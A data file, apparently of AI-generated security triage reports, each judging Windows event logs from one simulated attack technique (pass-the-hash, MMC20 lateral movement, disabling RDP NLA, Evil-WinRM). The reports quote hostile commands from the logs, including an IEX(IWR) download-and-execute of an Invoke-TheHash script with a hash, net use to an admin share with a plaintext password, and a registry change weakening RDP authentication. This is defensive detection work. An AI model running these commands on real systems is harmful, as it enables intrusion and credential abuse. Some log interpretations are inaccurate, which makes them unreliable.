@@ -1,0 +1,844 @@
+Directory Name,AI Response
+Enable Windows Remote Management,"Based on the provided logs, here is a detailed analysis focusing on the key events captured:
+
+### Application Log Analysis:
+1. **Event ID 15** indicates that Windows Defender is active and running, which is a standard security posture for systems.
+
+### PowerShell Log Analysis:
+1. A PowerShell command was executed with `Enable-PSRemoting -Force`. This command is used to enable PowerShell remoting, which can be a legitimate administrative action. However, if executed without proper context, it could indicate a security risk, particularly if performed on a high-value target like a CEO's machine.
+
+### System Log Analysis:
+1. **Windows Update Log Entries** (Event IDs 44, 43, 19) show routine updates for Microsoft Defender. These operations are typical for maintaining system security integrity.
+
+### Security Log Analysis:
+1. **Logon Events (4624)** and **Special Privilege Assignments (4672)** are observed:
+   - User `admin_test` was logged in using NTLM over the network (Logon Type 3). 
+   - This indicates access with elevated privileges, potentially concerning if not expected or routine for this user.
+   
+2. **Event ID 4634** indicates a successful logoff. 
+
+3. **Credential Validation Events (5379)** are frequently occurring; these involve reading security credentials but return `3221226021` indicating access denied or no credentials returned. This pattern could suggest possible attempts to escalate privileges or enumerate accounts that failed.
+
+### Sysmon Log Analysis:
+1. **Process Executions (Event ID 5)** from multiple executables like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe` are observed. `wevtutil.exe` and `powershell.exe` might indicate log management or system configurations.
+   
+2. **Potential Red Flag:** Execution of `wevtutil.exe` in proximity with elevated privileges and remote PowerShell commands suggest logging interactions or changes that could potentially hide malicious actions.
+
+### Assessment and Resolution:
+
+- **Suspicious Activities:**
+  - The execution of `Enable-PSRemoting -Force` is noteworthy, especially on a CEO's machine. While `PSRemoting` can be used for legitimate administration, its invocation without proper context on high-value assets signals a risk.
+  - The use of elevated privileges by `admin_test` and frequent credential inquiries imply possible lateral movements or privilege escalation attempts.
+
+- **Risk:**
+  - The current activity doesn't conclusively confirm malicious intent but demonstrates suspicious behavior that carries potential security implications, especially surrounding improper or unauthorized use of powershell remoting and privilege elevations.
+
+### Guidance:
+1. **Investigate the Context:**
+   - Determine if the `Enable-PSRemoting` was executed as part of a legitimate administrative task.
+   - Identify if the user `admin_test` had authorization for such actions on the machine.
+   - Review network logs for unusual access patterns or data transfers.
+   
+2. **Security Measures:**
+   - Monitor the network and system for further signs of administrative commands or log anomalies.
+   - Conduct a security audit on the CEO's system for any signs of compromise or misconfigurations.
+
+### Conclusion:
+The logs present **SUSPICIOUS** activity, which warrants further investigation to ensure security integrity and rule out any malicious compromise."
+PowerShell Lateral Movement using MMC20,"**Analysis:**
+
+Upon examining the provided logs, there are several activities worth noting:
+
+1. **PowerShell Activity:**
+   - There are repeated instances of a PowerShell command executing with `[activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.application"",""localhost"")).Document.ActiveView.ExecuteShellCommand(""c:\\windows\\system32\\calc.exe"", $null, $null, ""7"")`.
+   - The use of PowerShell to execute MMC20 and invoke Calculator through shell command execution is not typical behavior in regular usage scenarios. While invoking `calc.exe` directly isn't harmful, the method used is a well-known technique often associated with more nefarious intentions, used by attackers to establish persistence or bypass detection through scripts. Such a command is often seen in proof-of-concept scripts used for demonstrating privilege escalation or code execution techniques.
+
+2. **Sysmon Logs:**
+   - Several processes related to system utility executions are seen, such as `wbem\\wmiprvse.exe`, `conhost.exe`, `wevtutil.exe`, `mmc.exe`, etc., from `admin_test`, which is expected in a managed enterprise environment.
+   - Execution of `calc.exe` from MMC indirectly suggests the completion of the PowerShell command targeted towards spawning Calculator. This aligns with PowerShell log entries mentioned above.
+   - The absence of abnormal hash values associated with the system files, indicating possible tampering or credential theft, further reiterates that the files themselves are not altered.
+
+3. **Security Logs:**
+   - Logs show typical user logon sessions with privileges.
+   - NTLM authentication was used, which is normal for domain environments, no suspicious logons were detected here.
+
+4. **System and Application Logs:**
+   - Logs predominantly indicate regular updates related to Microsoft Defender and Edge, which are typical for a secure enterprise machine maintaining updates.
+   - The process executions and versions correspond to legitimate Windows update and Edge update processes without any integrity alerts.
+
+**Assessment:**
+
+The specific method of executing `calc.exe` through the PowerShell command suggests possible experimentation or testing of administrative capabilities, potentially by an in-house administrator or inadvertently by a user with administrative rights. This is a common technique in training scenarios or unauthorized security testing. The overall lack of persistence methods, dropped files, lateral movements, external command and control indications, or suspicious network activities in the logs suggest that this is an isolated incident.
+
+**Resolution: SUSPICIOUS**
+
+Given the unconventional use of PowerShell, I recommend marking this as **SUSPICIOUS**. While the activity in itself isn't overtly malicious, it's atypical enough to warrant further investigation to determine the intention behind executing such commands. Further steps include:
+- Validate that the execution was authorized by a legitimate user.
+- Ensure the account(s) involved are aware of security best practices.
+- Conduct additional analysis of the user activity around the event timeline to rule out potential security training or unauthorized penetration testing activities.
+- Enhance monitoring on the mentioned system for similar unusual PowerShell activities in the future."
+Exfiltration Over SMB over QUIC (NET USE),"**Detailed Analysis of Provided Logs:**
+
+1. **System Log:**
+   - The logs mainly consist of time change events, specifically from the Windows kernel and time service. Such events can occasionally be tied to time-drifts adjustments or network time protocol (NTP) synchronizations. All updates indicate the service was syncing the time with `time.windows.com`, indicating no manual time change.
+
+2. **Application Log:**
+   - The logs indicate the stopping of services related to Microsoft Edge Update. There's nothing particularly alarming as stopping and starting services can occur normally during updates or maintenance.
+
+3. **Sysmon Log:**
+   - A significant amount of activity revolves around a user 'SERVER002\admin_test' utilizing common Windows utilities such as `wevtutil`, `conhost`, `hostname`, `whoami`, and `powershell`. The frequent and automated-looking use of these commands can be indicative of:
+     - Routine administrative tasks performed on the server.
+     - Possible automated scripts for logging and system checks.
+   - Of particular note is the use of PowerShell with a suspicious command to connect to a network share (`\\example.com\sales`) with `/TRANSPORT:QUIC /SKIPCERTCHECK` parameters. This could potentially be malicious given the use of PowerShell for lateral movements or data exfiltration, along with skipping certificate checks which is often a red flag.
+   - The `powershell` and `net.exe` commands resemble attempts to map network shares and possibly copy files, which could be consistent with unauthorized data access or exfiltration.
+
+4. **Windows PowerShell Log:**
+   - Reflects the use of PowerShell with a command to mount a network share and copy a file without enforcing security checks, which suggests potentially unauthorized behavior. The command involves skipping certificate validation, indicating an intent to bypass typical security measures which warrants further scrutiny.
+
+5. **Security Log:**
+   - Logs related to time adjustment. This is typical and corresponds with what we see in the System logs; there's no direct security breach suggested through these logs.
+
+**Assessment and Resolution:**
+
+The activity in the logs includes potential indicators of scripted or automated execution of system utilities and network operations using PowerShell. Notably, using PowerShell to access remote resources with parameters that skip certificate checks, as shown in the logs, could signify potential malicious activity such as data exfiltration or lateral network movement.
+
+**Resolution: SUSPICIOUS**
+
+The use of the PowerShell command and potentially insecure network access needs more investigation to determine the legitimacy and purpose. Actions to verify these activities could include:
+- Investigating the purpose of the PowerShell script and verifying the legitimacy of the administrative user 'SERVER002\admin_test'.
+- Reviewing any additional activity around the time of the PowerShell command execution, including network logs to check for data transfers.
+- Ensuring that the network shares being accessed are legitimate and that access is approved and follows organizational policies.
+
+Further investigation and monitoring are needed to rule out any malicious intent or confirm the legitimacy of these activities."
+Execute command writing output to local Admin Share,"Upon examining the provided Windows event logs, here's a detailed analysis of the activities recorded within them:
+
+### System Log Analysis:
+1. **Registry Hive Resize (Event ID 15)**:
+   - `HiveName`: `\\??\\C:\\Windows\\System32\\config\\COMPONENTS` altered in size. This can happen during normal system operations or updates.
+
+2. **Time Change Events (Event ID 24 and 1)**:
+   - Multiple time change events were logged. These typically are associated with system time synchronization but could be exploited by an attacker to cover malicious activity.
+
+3. **Windows Update Activity (Event IDs 44, 43, 19)**:
+   - Routine updates for Microsoft Defender Antivirus were logged. This is normal behavior for patching systems against vulnerabilities.
+
+### Security Log Analysis:
+1. **Time Change Notifications (Event ID 4616)**:
+   - Time updates by the `LOCAL SERVICE` account, correlating with system log events, indicate a possible time synchronization process.
+
+2. **Credential Validation Failure (Event ID 5379)**:
+   - Several attempts to access Microsoft accounts with return code `3221226021` indicating invalid parameter. This might be a benign configuration error or, if frequent, could indicate potential unauthorized access attempts.
+
+### Sysmon Log Analysis:
+1. **Executable File Executions (Event ID 1)**:
+   - **Files:** `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `hostname.exe`, `whoami.exe`, `wuauclt.exe`
+   - Many of these are legitimate system utilities. However, the frequent chaining of `cmd.exe` with direct output to `\\\\127.0.0.1\\ADMIN$\\output.txt` could suggest data exfiltration or lateral movement tactics, especially when executed from a user directory like `C:\\Users\\admin_test\\Documents`.
+
+2. **Unusual Command Line Usage (Event ID 1)**:
+   - A potentially suspicious command was noted: `cmd.exe /c cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1`. This redirection to a file could imply something hidden, though no direct malicious indicators are confirmed without context or further suspicious patterns.
+
+### Application Log Analysis:
+1. **Windows Defender Status**:
+   - Logging normal operation of Windows Defender (`SECURITY_PRODUCT_STATE_ON`), showing AV functionality is active.
+
+### Conclusion:
+
+- **Suspicious Activity Identified**:
+  - The execution of chained commands redirecting output to network share paths warrants further investigation, especially in the context of the machine being the CEO's.
+  - As the logs indicate routine Windows operation otherwise, and no clear signs of privilege escalation or files originating from untrusted paths occur, these activities aren’t directly indicative of compromise on their own.
+
+### Assessment:
+- **Resolution: SUSPICIOUS**
+  - Activity seen suggests the need for further investigation, specifically around the command-line behavior to ensure no adversarial activity is masked as regular administrative operations.
+  
+### Recommended Actions:
+1. **Extended Log Analysis**:
+   - Obtain more context, possibly access logs, to see if this behavior correlates with specific tasks by the user or scheduled tasks.
+   
+2. **User and Process Correlation**:
+   - Verify if `admin_test` account actions align with legitimate administrative activity.
+   
+3. **Endpoint Monitoring**:
+   - Use EDR solutions to capture more data for any similar executions moving forward, ensuring they are legitimate.
+   
+4. **Audit Files & Processes**:
+   - Ensure no unauthorized files exist in typically secure directories, and verify the presence of any unsanctioned process activity.
+
+With further proof or context, the assessment could change towards more or less severity."
+Rubeus Kerberos Pass The Ticket,"### Detailed Analysis of Logs:
+
+After reviewing the provided logs, several points of concern regarding suspicious or potentially malicious activities have emerged:
+
+1. **PowerShell Activity:**
+   - There are multiple entries in the Windows PowerShell log that indicate the execution of a script (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe`) with elevated privileges. The script is using command-line arguments that include `/user:Administrator` and `/password:Password`, indicating a possible attempt to authenticate as an administrator.
+   - The PowerShell commands also include moving a ticket (`ticket.kirbi`) and requesting a TGS (Ticket Granting Service), which is a behavior consistent with Kerberos ticket manipulation, potentially indicative of a Pass-the-Ticket attack.
+
+2. **Sysmon Logs:**
+   - There is a process creation log for `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\script.exe`, which matches the script executed in the PowerShell logs, pointing to this behavior as suspicious.
+   - The `PSEXESVC.exe` service is installed and run, which is a known Sysinternals tool used for executing commands remotely. While not inherently malicious, its usage in conjunction with `script.exe` is concerning and may indicate unauthorized remote execution.
+   - The Sysmon logs also reveal the use of `wevtutil.exe`, which can be involved in clearing event logs - a common tactic to cover tracks during malicious activities.
+
+3. **Service Control Manager Logs:**
+   - The installation of the `PSEXESVC` service in the System log is aligned with the use of Sysinternals' PsExec, which can be used by attackers for lateral movement and executing commands remotely.
+
+4. **Edge Update Activity:**
+   - Multiple processes related to Microsoft Edge Update are observed; however, these match expected behaviors for updates and do not display immediate signs of being malware-infected processes.
+
+### Assessment of the Situation:
+
+- **Indicators of Compromise (IoC):**
+  - The execution of potentially malicious PowerShell scripts and the suspicious usage of PsExec (PSEXESVC) service suggests attempts at privilege escalation, lateral movement, or execution of remote commands.
+  - The combination of suspicious Kerberos ticket activity and remote execution tools is alarming and indicates possible unauthorized access and manipulation of credentials.
+
+### Threats or Risks Identified:
+
+- **Privilege Escalation:**
+  - Use of administrator credentials in PowerShell and potential Kerberos ticket forging.
+
+- **Remote Execution:**
+  - Deployment of Sysinternals' PsExec for potential lateral movement within the network.
+
+- **Covering Tracks:**
+  - Potential use of `wevtutil.exe` to clear event logs and hide the activities.
+
+### Resolution: **MALICIOUS**
+
+Given the strong indicators of potential malicious activity, including password usage, administrative authentication attempts, exploitation of Kerberos tickets, PsExec deployment, and possible log manipulation, the activities logged are considered **MALICIOUS**.
+
+### Guidance on How to Proceed:
+
+- **Immediate Containment:**
+  - Disconnect the affected host (Server002) from the network to prevent further malicious activity.
+  - Change all administrative credentials that may have been exposed.
+
+- **Investigation:**
+  - Conduct a thorough forensic investigation of the affected machine to gather more evidence of the attacker's activities.
+  - Verify whether any other machines in the network were affected by lateral movement.
+
+- **Remediation:**
+  - Clean the system of any malicious scripts or unauthorized services.
+  - Apply security patches and review security policies, particularly those related to remote administration and PowerShell execution.
+
+- **Monitoring and Prevention:**
+  - Increase monitoring for similar patterns of behavior across the network.
+  - Implement more stringent access controls and consider employing multi-factor authentication for privileged accounts."
+Remote Code Execution with PS Credentials Using Invoke-Command,"Based on the analysis of the provided logs, here is an evaluation of the potential threats or risks observed:
+
+### **1. Unusual Privileges and Activity:**
+- **Event 4672 (Security Log):** The account ""admin_test"" was granted special privileges, including SeDebugPrivilege, which is often used by attackers for debugging and analyzing code for privilege escalation.
+- **Event 4624 (Security Log):** An NTLM logon to the account ""admin_test"" was recorded from the workstation ""DESKTOP-3HL5B2P"" with a high privilege token.
+
+### **2. PowerShell Activity:**
+- **PowerShell Logs:** There is a log showing the execution of `Enable-PSRemoting -Force` followed by `Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}`. This indicates remote execution setups and user information check through a command. Such activity can often be part of lateral movement within a network.
+
+### **3. Network and Account Anomalies:**
+- **Events 4624 and 4634 (Security Log):** Display anonymous logons, which are notable since attackers often use anonymous access to hide their identity or perform reconnaissance.
+
+### **4. System and Application Logs:**
+- **System and Application Logs:** Show Windows Defender updates and other routine system activities. These do not exhibit direct signs of compromise by themselves.
+
+### **5. Sysmon Logs:**
+- **Image Loads and Process Creation:** Frequent events of `wevtutil.exe` and `conhost.exe` being run by ""admin_test"" with high integrity, looking for event logs or console host operations. No indication of other malicious binaries or scripts.
+
+### **Assessment:**
+There are several indicators that could suggest potentially malicious activities:
+- The elevated privileges granted to the user ""admin_test"" might suggest an attempt to perform unauthorized actions.
+- The use of PowerShell commands to enable remoting and execute remote commands raises potential concern for remote access attacks.
+- Anonymous login events may suggest reconnaissance or attempts to probe for vulnerabilities.
+
+### **Resolution:**
+**SUSPICIOUS**
+
+The observed activities in the logs are suspicious and warrant further investigation to determine if there is an actual compromise or malicious behavior. The combination of elevated privileges, PowerShell remote command execution, and anonymous logons raises the potential risk of a security incident. More context or correlating data from network monitoring and EDR alerts would help clarify the intentions and risks.
+
+### **Guidance:**
+1. **Review User Activity:** Investigate the actions performed by ""admin_test"", especially related to privileged operations and remote command executions.
+2. **Network Monitoring:** Check for unauthorized access or data exfiltration attempts related to ""DESKTOP-3HL5B2P"" or the IP addresses involved in the anonymous logons.
+3. **Endpoint Detection and Response (EDR):** Use EDR tools to trace back further potential lateral movement or recurring suspicious behaviors on the CEO's machine and related assets.
+4. **Isolate and Investigate:** If there is proof of unauthorized activity, isolate affected systems and conduct a thorough forensic investigation.
+
+This analysis serves as a foundation for further actions and confirms the need for a meticulous examination of the environment to ensure security integrity."
+Disable NLA for RDP via Command Prompt,"Upon reviewing the provided Windows event logs, several points of interest suggest potentially suspicious behavior:
+
+1. **Time Manipulation**: Observations from the system logs indicated changes to the system time:
+    - Event ID 1 from `Microsoft-Windows-Kernel-General` and Event ID 4616 from `Security-Auditing` reflect alterations to the system clock. Altering the system time can be indicative of an attempt to circumvent activity logging or to interfere with timestamp-based security mechanisms.
+
+2. **Privilege Escalation**:
+    - Security Log Event ID 4672 indicates that the user `admin_test` has been granted a set of privileges that include notable elevated rights such as `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, etc. This can suggest possible privilege escalation.
+
+3. **Command Execution and Registry Modification**:
+    - Sysmon log entries (Event ID 1) reveal the execution of `cmd.exe` with the command line `reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d 0 /t REG_DWORD /f`. This command modifies the Remote Desktop Protocol (RDP) settings to potentially weaken security by altering user authentication behavior, which can often be an indicator of an attempt to facilitate remote access.
+
+4. **Process Execution**:
+   - The repeated execution of system utilities (`wevtutil.exe`, `reg.exe`, `hostname.exe`, `whoami.exe`) under the `SERVER002\admin_test` account with high integrity suggests that someone was actively investigating the system environment or making unauthorized changes.
+
+5. **Remote Login**:
+   - Security Log Event ID 4624 (Logon Type 3, NTLM) indicates a network logon that could potentially be unauthorized, especially if related to an administrative user session. The workstation name `DESKTOP-3HL5B2P` may warrant further investigation to ascertain if this was a legitimate or intended connection.
+
+6. **Update and Anti-Malware Activity**:
+   - Activities associated with Windows Update and Microsoft Defender Antivirus updates seem routine and benign, indicated by process executions related to `wuauclt.exe` and `AM_Delta.exe`.
+
+### Assessment
+
+Given the above observations, the presence of direct registry changes to RDP settings, system time manipulation, privileged command execution, and logon activities suggest coordinated actions that align with potential attempts at unauthorized access or system configuration tampering. It is not conclusive enough to deem this activity as outright malicious without further context, but it certainly poses a risk and warrants additional investigation.
+
+### Resolution
+
+**SUSPICIOUS** - The logs contain activities that are not standard and require further investigation to determine potential compromise. You should:
+- Conduct further investigation on the `admin_test` account activities.
+- Review network logs and connection histories related to external and internal accesses during the outlined timestamps.
+- Inspect the system's RDP configurations and audit RDP access logs.
+- Validate the legitimacy of the `admin_test` account and any changes made to system privileges.
+- Recommend conducting threat hunting exercises targeting the anomalies observed."
+crackmapexec Pass the Hash,"## Detailed Analysis of the Event Logs
+
+### Suspicious or Anomalous Activities:
+
+1. **Time Manipulation Activities**:
+   - Security logs show time change events with EventID 4616. This event ID indicates the ""system time was changed,"" which can be a significant indicator of attempts to manipulate system logs to hide malicious activities. This was executed by `svchost.exe`, a legitimate system process, making it potentially suspicious without further contextual information.
+
+2. **Use of High Privileges**:
+   - EventID 4672 indicates special privileges assigned to a new logon. The special privileges include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others often used by malicious actors for privilege escalation and lateral movement.
+   - The `TargetUserName` is `admin_test`, suggesting administrative activities, but such extensive privilege use should be verified with legitimate administrative actions expected during the period.
+
+3. **Execution of PowerShell**:
+   - Sysmon logs indicate an execution of `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` by user `SERVERE002\\admin_test`. PowerShell is a powerful tool often used by attackers to execute malicious payloads disguised as normal administrative tasks.
+   - Also, the presence of an unknown process with Sysmon Event ID 5, which may signal attempts to obscure activity.
+
+4. **Execution of Command Line Tools**:
+   - `cmd.exe` was used with the command line including a potentially sensitive operation: `\""cmd.exe\"" /c C:\\scriptWin\\script.exe %%userdnsdomain%% -u Administrator -H [credentials] -x whoami`.
+   - The attempt to execute `whoami` could indicate enumeration activities, validating access levels or user context.
+
+5. **Frequent and Rapid Process Creation**:
+   - Several processes were observed being created in rapid succession, including `wevtutil.exe` and `conhost.exe`, which might be indicative of scripted or automated activity.
+   - The recurrence of rapid execution may suggest an automation process engaged in process spawning, typically indicative of lateral movement or malware propagation.
+
+### Indicators of Malicious Activity:
+
+- **Unusual Network Activities**:
+  - The presence of NTLM logon from `DESKTOP-3HL5B2P` with unknown IP `fe80::e3b5:5371:12a8:9c77` in the network logs but not in the context of these logs might be unrelated or warrant further investigation.
+
+- **Administrative Script Execution**:
+  - The presence of `C:\\scriptWin\\script.exe` with administrative credentials represents a direct threat level, especially when executed unexpectedly by non-legitimate operators or out of scheduling maintenance.
+
+- **Unsecured Script Execution**:
+  - Execution of `script.exe` with parameters indicating potential password exposure or brute force attempts through the flag `-H` with what appears to be sensitive credentials.
+
+### Recommended Guidance:
+
+- **Further Investigation**:
+  - Correlate system change with corroborative events such as file access or registry changes.
+  - Verify the legitimacy of `admin_test` account usage during the observed times.
+  - Audit PowerShell scripts and command line arguments executed by `admin_test`.
+  - Ensure all administrative scripts like `script.exe` are legitimate and review their intended use and permissions.
+
+- **Immediate Attention**:
+  - Elevate security monitoring on user `admin_test` and network activities stemming from `fe80::e3b5:5371:12a8:9c77` for potential unauthorized access.
+  - Secure privileged credentials and enforce multi-factor authentication to prevent unauthorized privilege escalation activities.
+
+### Resolution:
+
+Based on the identified activities, the logs contain behaviors that certainly warrant further investigation and thus should be concluded as:
+
+**SUSPICIOUS** - The evidence suggests potential unauthorized access or misuse of administrative privileges that should be thoroughly investigated."
+WinRM Access with Evil-WinRM,"Based on the analysis of the event logs provided, the following observations and findings have been noted:
+
+### Suspicious or Anomalous Behavior
+
+1. **Repeated Credential Access Attempts (Event ID 5379):** There are multiple logs showing access attempts to `MicrosoftAccount:user=02txoixylodcstop` with a return code of `3221226021` which indicates a ""credential not available"" error. The persistence of these attempts across several event entries can indicate an automated or scripted action attempting to access credentials or simulate credential access, potentially for credential abuse.
+
+2. **Privileged Logon and Privileges Granted (Event IDs 4624 and 4672):** A logon (Event ID 4624) as SYSTEM with elevated privileges granted shortly after (Event ID 4672) mentions privileges such as `SeDebugPrivilege` which is particularly potent and often targeted in privilege escalation attacks. These logs reflect normal operation only if associated tasks align with expected windows service activity.
+
+3. **Execution of PowerShell with Inline Credentials (Sysmon Event ID 1 and PowerShell Logs):** PowerShell is executed with a command-line that includes the password `P@ssw0rd1` for the `Domain\Administrator`. This is highly suspicious as it risks credential exposure and suggests potential lateral movement or administrative tasks being performed without appropriate security measures.
+
+4. **Frequent Use of `wevtutil.exe` (Sysmon Event ID 5):** This utility, which is used to interact with event logs, is executed multiple times, suggesting potential log clearing or tampering.
+
+### Indicators of Malicious Activity
+
+- **Inline Credentials Execution in PowerShell:** Using credentials directly in a PowerShell command is a common method for attackers to perform privileged actions without detection. The specific execution with administrator privileges hints at an attempt to perform high-level tasks potentially unauthorized.
+  
+- **Lateral Movement Indicators:** Frequent logons and attempted credential accesses, coupled with the use of `PowerShell` and attempts to interact with event logs (`wevtutil`), suggest potential lateral movement preparations or execution.
+
+### Assessment
+
+The combination of events, the method of tool usage, and sensitive information exposure align strongly with behaviors observed in malicious activities on compromised systems. The use of inline credentials is especially indicative of this.
+
+### Resolution: MALICIOUS
+
+#### Guidance on How to Proceed
+
+1. **Immediate Containment:**
+   - Disable the involved account (`admin_test`) and rotate all passwords potentially exposed.
+   - Isolate the machine `Server002` from the network to prevent potential lateral movement.
+
+2. **Investigation and Root Cause Analysis:**
+   - Analyze additional logs from network and endpoint systems to track any lateral movement.
+   - Check for unauthorized creation or modification of user accounts and policies.
+
+3. **Engage Incident Response:**
+   - Initiate a full incident response plan involving system forensics to evaluate the extent of access and any data exfiltration.
+   - Assess vulnerabilities in security posture that allowed this behavior.
+
+4. **Remediation and Hardening:**
+   - Apply safety measure like removal of hardcoded credentials in scripts.
+   - Ensure all patches and security updates are applied.
+   - Implement logging and alerting for sensitive command execution and credential access.
+
+By taking these actions, you can mitigate the immediate threat and prevent similar actions from occurring in the future."
+Invoke-WMIExec Pass the Hash,"The logs provided show several events that we need to analyze to determine if there's any malicious activity on the CEO's machine.
+
+### Analysis of Logs:
+
+1. **Sysmon Log Analysis:**
+   - There are several Sysmon EventID 5 indicating process termination. The logs frequently mention `wevtutil.exe` and `conhost.exe` being executed by the `SERVER002\admin_test` user. While `wevtutil.exe` is used to manage event logs, excessive use without justification might suggest log tampering or cleansing - a potential red flag for malicious activity.
+   - The execution of `hostname.exe` and `whoami.exe` followed by commands doesn't initially suggest malicious behavior. These utilities provide system information and are often used to script administrative tasks.
+
+2. **Suspicious PowerShell Execution:**
+   - There is a PowerShell script execution captured with the following command:
+     ```plaintext
+     powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, IEX (IWR 'https://raw.githubusercontent.com/script/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/script.ps1' -UseBasicParsing);script -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname}
+     ```
+   - The use of `IEX (IWR ...)` is highly suspicious because it downloads and immediately executes a script from the internet without local examination. This is a common technique used in attacks where malicious code is executed from an external source.
+  
+3. **Time Change Events:**
+   - There are security events (Event ID 4616) showing system time changes, which can be a tactic for evading logs (e.g., timestamp tampering to confuse the chronological order of events).
+
+4. **Network Services:**
+   - No unusual network-related activities or service terminations were logged that might indicate a network compromise.
+
+### Conclusion:
+The execution of the PowerShell command downloading a script from an external URL is a definitive indicator of potentially malicious activity. This, coupled with excessive use of utilities like `wevtutil.exe` which could suppress or clear log entries, suggests that the intent is to hide or obfuscate activity on the system.
+
+### Resolution:
+**MALICIOUS** - The logs contain activity, specifically the execution of a PowerShell script from the internet, which is characteristic of a malicious attempt to execute unauthorized actions on the system. Further steps should be taken immediately:
+
+1. **Immediate Steps:**
+   - Isolate the machine from the network to prevent any potential external instructions.
+   - Identify and mitigate potentially downloaded or installed malware from the referenced script.
+   - Conduct a full forensics analysis on this machine to understand the full scope of the compromise.
+
+2. **Long-Term Actions:**
+   - Strengthen security monitoring to detect similar patterns in the future.
+   - Conduct user training on the dangers of executing unverified scripts or downloads.
+   - Review permissions and controls on administrative accounts to minimize misuse.
+
+Overall, prompt analysis and remediation are essential to prevent broader exposure within the organization's network."
+Map admin share,"Upon analyzing the provided Windows event logs, several notable activities stand out that suggest potentially suspicious or malicious behavior:
+
+### Suspicious Activity Detected:
+1. **Command Execution with Credential Use:**
+   - Multiple instances of `cmd.exe` are seen executing a net use command with credentials:
+     - Command: `""cmd.exe"" /c cmd.exe /c ""net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator""`
+     - In general, using `net use` to establish a connection to another machine’s C$ share using Administrator credentials is an unusual and potentially risky behavior, especially on a high-value target like the CEO's machine. This might indicate lateral movement attempts by an attacker.
+
+2. **Privilege Escalation Attempts:**
+   - The security logs show an account `admin_test` acquiring several powerful privileges: `SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege`. The concentration of such high-level privileges is often unnecessary for routine operations by an admin and warrants further investigation.
+
+3. **Anomalous Process Execution:**
+   - The sequence of the `wevtutil.exe` and `conhost.exe` executions with no apparent legitimate reason is slightly concerning. Monitoring logs through `wevtutil` might indicate an attempt to hide malicious activity by deleting logs or stopping the logging service.
+
+### Assessment:
+
+Based on these key observations, the activities in the logs suggest suspicious behavior. The use of administrative credentials for remote connection, high-level privilege acquisition, and the process execution of potential utility functions with high integrity levels are typically behaviors that warrant further in-depth analysis. More context and a deeper investigation are needed to confirm whether these are indeed malicious actions.
+
+### Recommendation:
+
+- **Immediate Steps:**
+  - **Isolate the Host:** Prevent possible lateral movement or data exfiltration by temporarily isolating the host from the network.
+  - **Change Credentials:** Immediately change the credentials for any accounts involved in the `net use` connections.
+- **Investigation:**
+  - Conduct further forensic investigation on any anomalies and assess whether files were accessed or tampered with.
+  - Review user actions and intents, especially related to `admin_test` and the context in which powerful privileges are being utilized.
+- **Monitoring & Mitigation:**
+  - Enable enhanced monitoring on this machine and similar accounts for any repeat behavior.
+  - Educate employees on recognizing security threats, and enforce a stronger password policy.
+
+**Resolution:** SUSPICIOUS - Logs contain activity that appears abnormal and needs a deeper investigation to determine if actually malicious."
+Radmin Viewer Utility,"### Detailed Analysis:
+
+Based on the provided Windows event logs from Sysmon, Application, and the absence of logs from PowerShell, Security, and System, the following observations and analysis are made:
+
+#### Observations:
+
+1. **Microsoft Edge Update Activity:**
+   - Several `MicrosoftEdgeUpdate.exe` process executions are seen. These start from a temporary directory `C:\\Program Files (x86)\\Microsoft\\Temp\\EUA29F.tmp\\` which is unusual, as typically, Edge updates run from the Edge installation directory.
+   - Most executions operated under `NT AUTHORITY\\SYSTEM`, ensuring a high integrity level but potentially more control over the system resources.
+
+2. **Script and Shell Execution:**
+   - Multiple executions of `powershell.exe`, `wevtutil.exe`, `cmd.exe`, and `conhost.exe` by the user `SERVER002\\admin_test`.
+   - These process executions suggest system administration tasks but could also indicate post-exploitation activity if not typical for the user or environment.
+
+3. **Radmin Viewer Execution:**
+   - The command line `cmd.exe` with `/c` to run `Radmin Viewer 3` is notable. Radmin Viewer is a legitimate remote administration tool, but its unsupervised use can signify an intruder’s remote control tool.
+   
+4. **Use of Event Log Utility:**
+   - The frequent running of `wevtutil.exe` indicates potentially reading or clearing event logs, a common attacker step to hide tracks.
+
+5. **Administrative Activities:**
+   - Executions of system commands like `whoami.exe`, `HOSTNAME.EXE`, and running from `wsmprovhost.exe`, hint at administrative activities.
+   - This behavior could be mundane for an admin but suggests an attacker maintaining access or reconnoitering the environment.
+
+6. **Service Stop Event:**
+   - An `Application` log records ""Service stopped"" related to `edgeupdate`. While common for update services, the context is important when paired with suspicious activities.
+
+#### Assessment:
+
+- **Suspicion of Activity Originating from Temp Directory:**
+  - The use of the temp directory for Edge updates deviates from normal operational behavior, suggesting an irregular configuration or potentially tampered update process.
+
+- **Administrative or Malicious Actions:**
+  - Repeated administrative tools and script use without further context or approvals can be alarming, showcasing either standard administrative behavior or potential malicious intent.
+
+- **Radmin Viewer Trigger:**
+  - Requires examination to confirm if this is sanctioned use. If unauthorized, it suggests remote control activity by potential threats.
+
+- **Event Log Utility Usage Diligence:**
+  - Ensure that any script or task running these utilities complies with policies and expected behaviors.
+
+#### Conclusion:
+
+The log findings collectively suggest non-standard behavior that could be legitimate administrative tasks or indicative of stealthy malicious actions:
+
+- **Resolution:** **SUSPICIOUS**
+  - The events recorded appear fishy, especially with unconventional update paths and potential use of remote administration tools.
